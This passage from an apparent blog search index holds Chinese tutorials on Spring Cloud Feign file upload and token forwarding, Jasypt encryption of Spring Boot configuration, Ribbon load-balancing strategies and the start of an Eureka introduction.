multipartFormEncoder() { return new SpringFormEncoder(); }} 编写 Consumer 端（服务提供者）的 Feign 文件上传的客户端： 12345678910111213@FeignClient(name = "PROVIDER", configuration = FeignMultipartSupportConfig.class)public interface FileUploadFeignService { /*** * produces, consumes必填 * @param file * @return */ @RequestMapping(value = "/uploadFile", method = RequestMethod.POST, produces = {MediaType.APPLICATION_JSON_UTF8_VALUE}, consumes = MediaType.MULTIPART_FORM_DATA_VALUE) String fileUpload(@RequestPart(value = "file") MultipartFile file);} 使用 Swagger2，并编写 Consumer 端（服务提供者）的 Controller 类，用于上传文件： 1234567891011121314@RestController@Api(value = "文件上传接口")@RequestMapping("/feign")public class FeignUploadController { @Autowired private FileUploadFeignService fileUploadFeignService; @ApiOperation(value = "文件上传", notes = "请选择文件上传") @PostMapping(value = "/upload", consumes = MediaType.MULTIPART_FORM_DATA_VALUE) public String imageUpload(@RequestPart(value = "file") @ApiParam(value = "文件上传", required = true) MultipartFile file) throws Exception { return fileUploadFeignService.fileUpload(file); }} 编写 Provider 端（服务提供者）的 Controller 类，用于接收 Feign Client 上传的文件: 12345678@RestControllerpublic class FeignUploadController { @PostMapping(value = "/uploadFile", consumes = MediaType.MULTIPART_FORM_DATA_VALUE) public String fileUploadServer(@RequestPart(value = "file") MultipartFile file) throws Exception { return "file-name: " + file.getOriginalFilename() + " file-size: " + file.getSize(); }} 分别启动各个应用后，浏览器访问 http://127.0.0.1:8080/swagger-ui.html，通过 Swagger2 提供的 UI 界面上传文件即可。 Feign 处理首次请求失败当 Feign 和 Ribbon 整合了 Hystrix 之后，可能会出现首次调用失败的问题。原因是 Hystrix 默认的超时时间是 1 秒，如果超过这个时间尚未作出响应，将会进入 fallback 代码。由于 Bean 的装配以及懒加载机制等，Feign 首次请求都会比较慢，如果这个响应时间超过 1 秒，就会出现请求失败的问题。此时可以采取以下三种方法处理： 使用 Feign 的时候直接关闭 Hystrix（不推荐）： feign.hystrix.enabled=false 禁用 Hystrix 的超时时间： hystrix.command.default.execution.timeout.enabled=false 将 Hystrix 的超时时间改为 5 秒： hystrix.command.default.execution.isolation.thread.timeoutInMilliseconds=5000 Feign 调用传递 Token在进行认证鉴权的时候，不管是 JWT 还是 Spring Security，当使用 Feign 时就会发现外部请求到 A 服务的时候，A 服务是可以拿到 Token 的；然而当 A 服务使用 Feign 调用 B 服务时，Token 就会丢失，从而导致认证失败。解决方法比较简单，可以利用 RequestInterceptor 拦截器，在 Feign 调用的时候，向请求头里面添加需要传递的 Token，示例代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940/** * Feign统一Token拦截器 */@Componentpublic class FeignTokenInterceptor implements RequestInterceptor { @Override public void apply(RequestTemplate requestTemplate) { if(null==getHttpServletRequest()){ //此处省略日志记录 return; } //将获取Token对应的值往下面传 requestTemplate.header("oauthToken", getHeaders(getHttpServletRequest()).get("oauthToken")); } private HttpServletRequest getHttpServletRequest() { try { return ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest(); } catch (Exception e) { return null; } } /** * Feign拦截器拦截请求获取Token对应的值 * @param request * @return */ private Map&lt;String, String&gt; getHeaders(HttpServletRequest request) { Map&lt;String, String&gt; map = new LinkedHashMap&lt;&gt;(); Enumeration&lt;String&gt; enumeration = request.getHeaderNames(); while (enumeration.hasMoreElements()) { String key = enumeration.nextElement(); String value = request.getHeader(key); map.put(key, value); } return map; }} Feign 返回图片流在使用 Feign 的过程中，可以将图片流转换成字节数组来传递，但是因为 Controller 层不能直接返回 byte，因此需要将 Feign 的返回值修改为 feign.Response 12@RequestMapping(value = "/createImageCode")public Response createImageCode(@RequestParam("imageKey") String imageKey); venus-cloud-feign 的使用为了方便在 API 中使用 Feign 替代 RestTemplate 的手动调用，在写 Feign 接口的时候，想用 Spring MVC 注解只在 Feign 接口写一遍，然后实现类实现此接口即可。但是 Spring MVC 不支持实现接口里的方法参数上的注解（支持继承类、方法上的注解），而且在 GET 请求多参数传递的问题上，需要通过拦截器的方式解决。为了解决上述两个问题，Spring Cloud 中国社区对 Spring Cloud Feign 进行了增强，项目名为 venus-cloud-feign，目前只支持 Spring Cloud 的 Finchley 版本，更多使用方式可以参考官方文档，这里不再累述。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"SpringBoot 配置文件数据加密",url:"/posts/252cb266.html",text:'前言SpringBoot 配置文件中的数据库账户、密码等敏感数据不能明文展示，否则代码泄露的话，数据库的数据会被恶意利用。 加密算法 Jasypt Spring Boot 2.x 默认使用的加密算法是 PBEWithMD5AndDES，其中的 IV 生成器是 org.jasypt.iv.NoIvGenerator Jasypt Spring Boot 3.x 默认使用的加密算法是 PBEWITHHMACSHA512ANDAES_256，其中的 IV 生成器是 org.jasypt.iv.RandomIvGenerator 添加 Maven 坐标12345&lt;dependency&gt; &lt;groupId&gt;com.github.ulisesbocchio&lt;/groupId&gt; &lt;artifactId&gt;jasypt-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;3.0.4&lt;/version&gt;&lt;/dependency&gt; 加密与解密测试测试加密与解密的代码1234567891011121314151617181920212223242526272829303132333435public class EncryptTest { /** * 加密/解密所需的秘钥（盐） */ private final String salt = "Jasypt@Test"; /** * 加密 */ @Test public void encrypt() { BasicTextEncryptor textEncryptor = new BasicTextEncryptor(); // 加密所需的秘钥（盐） textEncryptor.setPassword(salt); // 要加密的数据 String password = textEncryptor.encrypt("root"); // 每次生成的密文都不一样 System.out.println("encrypt password: " + password); } /** * 解密 */ @Test public void decrypt() { BasicTextEncryptor textEncryptor = new BasicTextEncryptor(); // 解密所需的秘钥（盐） textEncryptor.setPassword(salt); // 要解密的数据 String password = textEncryptor.decrypt("AM7Q/hDyHcuNswbXO02c1w=="); System.out.println("decrypt password: " + password); } } 值得一提的是，在上述手动调用 Jasypt API 的代码中，BasicTextEncryptor 类使用加密算法是 PBEWithMD5AndDES。若希望使用 PBEWITHHMACSHA512ANDAES_256 加密算法，可以使用 AES256TextEncryptor 类来替代，更多内容请查看 Jasypt 的源码。 测试加密与解密的命令行 命令行加密 1java -cp jasypt-1.9.3.jar org.jasypt.intf.cli.JasyptPBEStringEncryptionCLI input="root" password="Jasypt@Test" algorithm=PBEWithMD5AndDES ivGeneratorClassName=org.jasypt.iv.NoIvGenerator 命令行解密 1java -cp jasypt-1.9.3.jar org.jasypt.intf.cli.JasyptPBEStringDecryptionCLI input="AM7Q/hDyHcuNswbXO02c1w==" password="Jasypt@Test" algorithm=PBEWithMD5AndDES ivGeneratorClassName=org.jasypt.iv.NoIvGenerator SpringBoot 配置文件测试环境配置解密所需的秘钥（盐）与解密算法，并使用 ENC() 包裹加密后的数据信息，这样 Jasypt 才知道要解密哪些数据。 特别注意 在 SpringBoot 的配置文件中，强烈建议使用 algorithm 与 iv-generator-classname 参数来指定解密算法。这样可以避免在应用启动时，可能由于加解密使用的算法不一致，导致 Jasypt 无法解密配置文件的密文数据。 1234567891011121314# 配置解密所需的秘钥（盐）、解密算法jasypt: encryptor: password: Jasypt@Test algorithm: PBEWithMD5AndDES iv-generator-classname: org.jasypt.iv.NoIvGenerator# 使用加密后的数据信息spring: datasource: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://127.0.0.1:3306/wcscanner?characterEncoding=utf-8&amp;useSSL=false&amp;allowPublicKeyRetrieval=true username: ENC(bRVJmN0LlgBAIcXSknCTFQ==) password: ENC(u1HCmk1og6N0wvmnewJI2Q==) 生产环境命令行参数方式上面的 YAML 配置方式，虽然数据库的配置信息使用了密文，但还是非常不安全，因为解密的秘钥（盐）暴露在 application.yml 配置文件中。为了防止秘钥（盐）意外泄漏，被恶意反解出密码，可以在应用部署的时候使用命令行参数传入秘钥（盐）。 1java -jar shop.jar --jasypt.encryptor.password=Jasypt@Test --jasypt.encryptor.algorithm=PBEWithMD5AndDES --jasypt.encryptor.iv-generator-classname=org.jasypt.iv.NoIvGenerator Linux 环境变量方式为了方便统一管理秘钥（盐），可以将秘钥添加到 Linux 系统的环境变量里。 编辑配置文件 1vim /etc/profile 在配置文件末尾，添加环境变量（秘钥） 1export JASYPT_PASSWORD=Jasypt@Test 使配置文件生效 1source /etc/profile 运行 SpringBoot 应用 1java -jar shop.jar --jasypt.encryptor.password=${JASYPT_PASSWORD} --jasypt.encryptor.algorithm=PBEWithMD5AndDES --jasypt.encryptor.iv-generator-classname=org.jasypt.iv.NoIvGenerator 常见错误应用启动提示解密失败SpringBoot 应用启动时，提示解密失败，输出下述的错误信息： 1Decryption of Properties failed, make sure encryption/decryption passwords match 这一般是加密与解密时使用的算法不一致导致的，建议检查 SpringBoot 的配置文件，观察是否有使用 algorithm 与 iv-generator-classname 参数来指定加密算法，没有的话就加上去。 12345jasypt: encryptor: password: Jasypt@Test algorithm: PBEWithMD5AndDES iv-generator-classname: org.jasypt.iv.NoIvGenerator JCE 密钥长度限制问题使用 PBEWITHHMACSHA512ANDAES_256 加密算法后，SpringBoot 应用启动时抛出以下异常。这是由于使用了强加密算法，且未在 Java 虚拟机中安装 Java 加密扩展（JCE）无限强度管辖权策略文件，导致在使用 AES、ElGamal 等加密算法时密钥的长度受到了限制。 1A possible cause is you are using strong encryption algorithms and you have not installed the Java Cryptography Extension (JCE) Unlimited Strength Jurisdiction Policy Files in this Java Virtual Machine 解决办法是下载 JCE 文件到本地虚拟机，JCE 文件可以从下述地址下载，安装教程可看 这里。 JCE 低版本 JCE 8 - 适用于 JDK 8 参考资料 记录 Jasypt 加密解密中遇到的坑 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java"},{title:"Ribbon 入门教程 - 基础篇",url:"/posts/76f2eddc.html",text:'Ribbon 介绍Ribbon 是什么Ribbon 是 Netflix 公司开发的一个负载均衡组件，诞生于 2013 年 1 月，一直是 Netflix 活跃度较高的项目，由 Pivotal 公司将其整合进 Spring Cloud 生态。Ribbon 是一个基于 HTTP 和 TCP 的客户端负载均衡工具，通过 Spring Cloud 的封装， 可以轻松地将面向服务的 REST 模板请求自动转换成客户端负载均衡的服务调用。 此外，Ribbon 拥有丰富的负载均衡策略、重试机制、支持多协议的异步与响应式模型、容错、缓存与批次处理等功能。Ribbon 虽然只是一个工具类框架，它不像服务注册中心、配置中心、API 网关那样需要独立部署，但是它几乎存在于每一个 Spring Cloud 构建的微服务和基础设施中。 因为微服务间的调用，API 网关的请求转发等内容实际上都是通过 Ribbon 来实现的，Feign、Zuul 已经集成了 Ribbon，更多介绍可参考：Ribbon 项目、Ribbon 官方英文文档、Spring Cloud Ribbon 官方中文文档 Ribbon 与负载均衡负载均衡（Load Balance），即利用特定方式将流量分摊到多个操作单元上的一种手段，它对系统吞吐量与系统处理能力有着质的提升，当今极少企业没有用到负载均衡器或是负载均衡策略。常见的负载均衡实现有 Nginx 与 LVS，且不管它们的使用方式，工作在什么层次，本质还是对流量的疏导。业界对于负载均衡有不少分类，最常见的有软负载与硬负载，代表产品是 Nginx 与 F5；还有一组分类最能体现出 Ribbon 与传统负载均衡的差别，那就是集中式负载均衡与进程内负载均衡。集中式负载均衡指位于因特网与服务提供者之间，并负责把网络请求转发到各个提供单位，这时候 Nginx 与 F5 就可以归为一类，也可以称是服务端负载均衡。进程内负载均衡是指从一个实例库选取一个实例进行流量导入，在微服务的范畴内，实例库一般存储在 Zookeeper、Eureka、Consul、etcd 这样的注册中心，而此时的负载均衡器就是类似 Ribbon 的 IPC（Inter-Process Communication，进程间通信）组件，因此进程内负载均衡也叫做客户端负载均衡。 Ribbon 入门案例1. 版本说明在下面的的教程中，使用的 Spring Cloud 版本是 Finchley.RELEASE，对应的 Spring Boot 版本是 2.0.3，点击下载完整的案例代码 2. 创建 Maven 父级 Pom 工程在父工程里面配置好工程需要的父级依赖，目的是为了更方便管理与简化配置，具体 Maven 配置如下 1234567891011121314151617181920212223242526272829303132333435363738&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- 利用传递依赖，公共部分 --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- 管理依赖 --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--注意：这里需要添加以下配置，否则可能会有各种依赖问题 --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 3. 创建 Eureka Server 工程创建 Eureka Server 的 Maven 工程，配置工程里的 pom.xml 文件，需要引入 spring-cloud-starter-netflix-eureka-server 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Eureka Server 的启动主类，这里添加相应注解，作为程序的入口： 12345678@SpringBootApplication@EnableEurekaServerpublic class EurekaServerApplication { public static void main(String[] args){ SpringApplication.run(EurekaServerApplication.class, args); }} 添加 Eureka Server 需要的 application.yml 配置文件到工程中 1234567891011server: port: 8090eureka: instance: hostname: 127.0.0.1 client: registerWithEureka: false fetchRegistry: false serviceUrl: defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/ 4. 创建 Provider 源服务工程为了测试 Ribbon 的负载均衡功能，必须要有一个源服务（服务提供者），并且可以选择启动多个实例，在每个实例中需要有一个标识（例如端口）来识别每次的调用是到了不同的服务实例上。这里可以使用一份代码，采取改变端口号的方式启动多次，就能启动多个相同的服务实例。创建 Provider 的 Maven 工程后，由于需要将服务注册到 Eureka Server，工程下的 pom.xml 文件需要引入 spring-cloud-starter-netflix-eureka-client 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建 Provider 的启动主类，添加注解 @EnableDiscoveryClient，将服务注册到 Eureka Server： 12345678@SpringBootApplication@EnableDiscoveryClientpublic class ProviderApplication { public static void main(String[] args){ SpringApplication.run(ProviderApplication.class, args); }} 在 application.yml 文件中指定服务名称（provider）、注册中心地址与端口号，后面启动多实例只需要修改这里的端口号即可： 12345678910111213server: port: 9090spring: application: name: providereureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true 创建用于测试的 Controller 类： 12345678@RestControllerpublic class ProviderController { @GetMapping("/provider/add") public String add(Integer a, Integer b, HttpServletRequest request) { return "From Port: " + request.getServerPort() + ", Result: " + (a + b); }} 5. 创建 Ribbon 客户端工程要使用 Ribbon，需要在 pom.xml 文件中引入依赖 spring-cloud-starter-netflix-ribbon，另外由于需要从 Eureka Server 获取服务列表，即作为 Eureka 客户端，还需要引入 spring-cloud-starter-netflix-eureka-client 12345678910&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-ribbon&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 创建启动主类，添加注解 @EnableDiscoveryClient 12345678@SpringBootApplication@EnableDiscoveryClientpublic class RibbonLoadBalanceApplication { public static void main(String[] args){ SpringApplication.run(RibbonLoadBalanceApplication.class, args); }} 创建统一配置类，声明 RestTemplate 的 Bean，并且添加注解 @LoadBalanced，指定该 RestTemplate 需要使用客户端负载均衡： 123456789@Configurationpublic class CommonConfiguration{ @Bean @LoadBalanced public RestTemplate restTemplate(){ return new RestTemplate(); }} 创建用于测试的 Controller 类，因为 Ribbon 客户端需要创建一个 API 来供第三方调用 Provider 源服务的那个自定义 API，这里需要用 RestTemplate 来调用： 123456789101112131415@RestControllerpublic class CalculateController { @Autowired private RestTemplate restTemplate; /** * 这里的"PROVIDER"是服务提供者的实例名称的英文大写 */ @GetMapping("/add") public String add(Integer a, Integer b) { String result = restTemplate.getForObject("http://PROVIDER/provider/add?a=" + a + "&amp;b=" + b, String.class); return result; }} 在 application.yml 文件中配置端口号、注册中心地址即可： 12345678910111213server: port: 8080spring: application: name: ribbon-loadbalanceeureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true 6. 测试 启动 Eureka Server 后，更改 Provider 源服务的端口号为 9091 与 9092 后分别启动，浏览器访问 http://127.0.0.1:8090，查看 Eureka Server 的界面是否正常显示多个 Provider 源服务 启动 Ribbon 客户端应用，浏览器访问 http://127.0.0.1:8080/add?a=10&amp;b=5，若正常返回计算结果，说明整个项目运行成功 提示：当存在多个服务提供者时，Ribbon 默认会使用轮询的方式访问源服务，此外 Ribbon 对服务实例节点的增减也能动态感知 Ribbon 负载均衡策略内置的七种负载均衡策略Ribbon 按照不同的需求，已经提供 7 种实现了 IRule 接口的实现类，包含了常用的负载均衡策略，默认的策略是轮询策略。内置的策略能够适用大部分负载均衡需求的应用场景，若有更复杂的需求，可以自己实现 IRule 接口。 策略类 命名 描述 实现说明 RandomRule 随机策略 随机选择可用的服务器 在 index 上随机，选择 index 对应位置的服务器 RoundRobinRule 轮询策略 按顺序循环选择服务器 轮询 index，选择 index 对应位置的服务器 RetryRule 重试策略 对选定的负载均衡策略机上重试机制 在一个配置时间段内当选择服务器不成功，则一直尝试使用 subRule 的方式选择一个可用的服务器 BestAvailableRule 最低并发策略 选择一个并发请求量最少的服务器 逐个考察服务器，如果服务器的断路器打开，则忽略，再选择其他并发连接数最低的服务器 AvailabilityFilteringRule 可用过滤策略 过滤掉一直连接失败并被标记为 circuit tipped 的服务器，过滤掉那些高并发连接的服务器（active connections 超过配置的阀值） 使用一个 AvailabilityPredicate 来包含过滤服务器的逻辑，其实就是检查 status 里记录的各个服务器的运行状态 WeightedResponseTimeRule 响应时间加权策略 根据服务器的响应时间分配权重。响应时间越长，权重越低，被选择到的概率越低；响应时间越短，权重越高，被选择到的概率就越高。这个策略很贴切，综合了各种因素，如：网络、磁盘、CPU 等，这些因素都直接影响着响应时间 一个后台线程定期的从 status 里面读取评价响应时间，为每个服务器计算一个权重；其中权重的计算也比较简单，responsetime 减去每个服务器自己平均的 responsetime 就是服务器的权重。当刚开始运行，没有形成 status 时，使用轮询策略选择服务器 ZoneAvoidanceRule 区域权衡策略 综合判断服务器所在区域的性能和服务器的可用性来轮询选择服务器，并且判断一个 Zone 的运行性能是否可用，剔除不可用的 Zone 中的所有服务器 使用 ZoneAvoidancePredicate 和 AvailabilityPredicate 来判断是否选择某个服务器，前一个判断判定一个 zone 的运行性能是否可用，剔除不可用的 zone 的所有服务器，AvailabilityPredicate 则用于过滤掉连接数过多的服务器 全局负载均衡策略的配置使用 Ribbon 的时候若想要全局更改负载均衡策略，此时只需要增加一个配置类，加上之后凡是通过 Ribbon 的请求都会按照配置的策略来进行负载均衡 12345678@Configurationpublic class RuleConfiguration { @Bean public IRule customRule(){ return new RandomRule(); }} 基于注解的自定义策略配置若想针对某一个源服务设置其特有的负载均衡策略，可以通过使用 @RibbonClient 注解来实现。 创建 @AvoidScan 注解类，只有一个空的声明 123public @interface AvoidScan {} 配置类里注入针对 Ribbon 客户端的配置管理器（非必须），添加 @AvoidScan 注解 123456789101112@AvoidScan@Configurationpublic class RuleConfiguration { @Autowired IClientConfig config; @Bean public IRule customRule(IClientConfig config){ return new RandomRule(); }} 启动主类加上 @RibbonClient 注解，配置内容表示对 provider 服务使用的策略是通过 RuleConfiguration 类所配置的。此外这里使用 @ComponentScan 注解的意思是让 Spring 不去扫描被 @AvoidScan 注解标记的配置类，因为这里的策略配置是希望对单个源服务生效的，所以不能应用于全局。若不想使用 @AvoidScan 注解，只要保证 RuleConfiguration 类 不被 @ComponentScan 注解扫描到就行，简单的做法可以将 RuleConfiguration 类不存放在启动主类（RibbonLoadBalanceApplication）所在的包及其子包下。特别注意：无论是在 Java 代码中还是 YML 配置文件中，只要引用到服务名称的地方，都需要使用大写英文字符的服务名称，否则会找不到对应的服务提供者，导致策略的配置不生效 12345678910@SpringBootApplication@EnableDiscoveryClient@RibbonClient(name = "PROVIDER", configuration = RuleConfiguration.class)@ComponentScan(excludeFilters = {@ComponentScan.Filter(type = FilterType.ANNOTATION, value = {AvoidScan.class})})public class RibbonLoadBalanceApplication { public static void main(String[] args){ SpringApplication.run(RibbonLoadBalanceApplication.class, args); }} 若想对多个源服务指定对应的负载均衡策略，可以使用 @RibbonClients 注解 123456@RibbonClients(value = { @RibbonClient(name = "PROVIDER-USER", configuration = UserRuleConfiguration.class), @RibbonClient(name = "PROVIDER-DEPT", configuration = DeptRuleConfiguration.class)})public class RibbonLoadBalanceApplication {} 基于配置文件的自定义策略配置可以使用配置文件来对源服务的负载均衡策略进行配置，其基本语法是 &lt;service name&gt;.ribbon.*，使用它几乎可以不用写注解形式的任何配置代码，下述配置是对 provider 服务使用随机策略 123PROVIDER: ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RandomRule 区域权衡策略的配置Ribbon 默认实现了区域权衡策略，因此可以通过 Eureka 实例的元数据配置来实现区域化的实例配置方案。Ribbon 会优先访问与客户端处于一个 Zone 中的服务端实例，只有当被选中的 Zone 中没有可用的服务端实例的时候才会访问其他 Zone 中的服务端实例。因此通过 zone 属性的定义，将处于不同机房的实例配置成不同的区域值，配合实际部署的物理结构，可以有效地设计出针对区域性故障的容错集群。而实现的方式非常简单，只需在 Eureka 的服务实例的元数据中增加 zone 参考来指定自己所在的区域，下述内容是配置在 Eureka 的服务实例中： 1234eureka: instance: metadata-map: zone: shanghai Ribbon 配置实战Ribbon 超时与重试使用 HTTP 发起请求，免不了遇到极端环境，此时对调用进行时限控制以及时限之后的重试尤为重要。在 Spring Cloud 的 Brixtion 版本中，对于重试机制的实现需要开发者自行扩展实现，而从 Camden SR2 版本开始，Spring Cloud 整合了 Spring Retry 来增加 RestTemplate 的重试能力，只需要通过简单的配置，原来那些通过 RestTemplate 实现的服务访问就会自动根据配置来实现重试机制。注意，Finchley 版中 Ribbon 的重试机制默认是开启的，只需要添加针对超时时间与重试策略的配置即可。下述配置是对 provider 服务配置超时与重试相关参数： 12345678PROVIDER: ribbon: ConnectTimeout: 3000 ReadTimeout: 60000 MaxAutoRetries: 1 #对第一次请求的服务的重试次数 MaxAutoRetriesNextServer: 1 #要重试的下一个服务的最大数量（不包括第一个服务） OkToRetryOnAllOperations: true NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RandomRule Ribbon 的饥饿加载Ribbon 在进行客户端负载均衡的时候，并不是启动时就加载上下文的，而是在实际请求的时候才去创建，因此这个特性往往会让第一次调用显得疲软乏力，严重的时候会引起调用超时。此时可用通过指定 Ribbon 具体的客户端的名称来开启饥饿加载，即在启动的时候便加载所有配置项的应用程序上下文。 1234ribbon: eager-load: enabled: true clients: PROVIDER-USER, PROVIDER-DEPT, PROVIDER-ORDER 基于配置文件自定义 Ribbon 客户端Ribbon 在 1.2.0 版本之后，支持使用配置文件来定制 Ribbon 客户端，其实质就是使用配置文件来指定一些默认加载类，从而更改 Ribbon 客户端的默认行为方式，并且这种方法的优先级是最高的，优先级高于使用注解 @RibbonClient 指定的配置和 Java 源码中加载的相关 Bean，具体配置规则如下： 下述配置，表示是对 provider 服务使用随机策略 123PROVIDER: ribbon: NFLoadBalancerRuleClassName: com.netflix.loadbalancer.RandomRule Ribbon 脱离 Eureka 的使用在默认情况下，Ribbon 客户端会从 Eureka 注册中心读取服务注册信息列表，来达到动态负载均衡的目的。若不想从 Eureka 注册中心读取服务注册列表，可以配置 Ribbon 客户端使用指定的源服务地址，让 Ribbon 脱离 Eureka 使用，配置实例如下： 1234567ribbon: eureka: enabled: false #禁用Eureka的功能PROVIDER: ribbon: listOfServers: http://127.0.0.1:7000, http://127.0.0.1:7001 #指定provider服务的服务地址 Ribbon 进阶核心接口 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务"},{title:"Eureka 入门教程 - 基础篇",url:"/posts/be1e11c7.html",text:'Eureka 介绍Eureka 是什么Eureka 是 Netflix 开发的一款基于 HTTP REST 的服务，由 Pivotal 公司将其整合进 Spring Cloud 生态。Netflix 在设计 Eureka 时遵守的是 AP 原则，通常用于服务注册发现、负载均衡和故障转移等，也是 Spring Cloud 中使用的服务注册发现组件。Eureka 采用 C/S 架构，提供了一个基于 Java 的 Client 组件，用来与服务端交互，同时具有一套内置的负载均衡器，可以进行基本的轮询负载均衡。Eureka 从 2012 年 9 月在 Github 上发布 1.1.2 版本以来，至今已经发布了 231 次，最新版本为 2020 年 4 月份发布的 1.9.20 版本。期间有进行 2.x 版本的开发，不过由于各种原因内部已经冻结开发，目前还是以 1.x 版本为主。更多介绍可参考：Eureka 项目、Eureka 官方英文文档、Spring Cloud Eureka 官方中文文档 Eureka 服务治理体系 Eureka 服务的三个角色 服务注册中心：Eureka 提供的服务端，提供服务注册与发现的功能，一般被称作 Eureka-Server； 服务消费者：消费者应用从服务注册中心获取服务列表，从而使消费者可以知道去何处调用其所需要的服务； 服务提供者：提供服务的应用，可以是 Spring Boot 应用，也可以是其他技术平台且遵循 Eureka 通信机制的应用。它将自己提供的服务注册到 Eureka，以供其他应用发现。 Eureka 高可用性Eureka 的高可用性Eureka 的服务注册中心，它和其他服务注册中心一样，支持高可用配置。依托于强一致性提供良好的服务实例可用性，可以应对多种不同的故障场景。Eureka 服务端支持集群模式部署，当集群中有分片发生故障的时候（超过 85% 的服务实例丢失心跳），Eureka 会自动转入自我保护模式。它允许在分片发生故障的时候继续提供服务的发现和注册，当故障恢复时，集群中的其他分片会把各自的状态再次同步回来。集群中的的不同服务注册中心通过异步模式互相复制各自的状态，这也意味着在给定的时间点每个实例关于所有服务的状态可能存在不一致的现象。 Eureka 的自我保护模式默认情况下，如果 Eureka Server 在一定时间内（默认 90 秒）没有接收到某个微服务实例的心跳，Eureka Server 将会注销该实例。但是当网络分区故障发生时，微服务与 Eureka Server 之间无法正常通信，这就可能变得非常危险了。因为微服务本身是健康的，此时本不应该注销这个微服务。Eureka Server 通过 “自我保护模式” 来解决这个问题，当 Eureka Server 节点在短时间内丢失过多客户端时（超过 85% 的服务实例丢失心跳，可能发生了网络分区故障），那么这个节点就会进入自我保护模式。一旦进入该模式，Eureka Server 就会保护服务注册表中的信息，不再删除服务注册表中的数据（也就是不会注销任何微服务）。当网络故障恢复后，该 Eureka Server 节点会自动退出自我保护模式。自我保护模式是一种对网络异常的安全保护措施，使用自我保护模式，可以让 Eureka 集群更加的健壮、稳定。 在自我保护模式中，Eureka Server 会保护注册表中的信息，不再注销任何服务实例。当它收到的心跳数重新恢复到阀值以上时，该 Eureka Server 节点就会自动退出自我保护模式。它的设计哲学就是宁可保留错误的服务注册信息（健康或不健康的微服务都会保留），也不盲目注销任何可能健康的服务实例。在 Spring Cloud 中，可以使用 eureka.server.enable-self-preservation: false 来禁用自我保护模式。 Eureka 自我保护模式的效果 Eureka 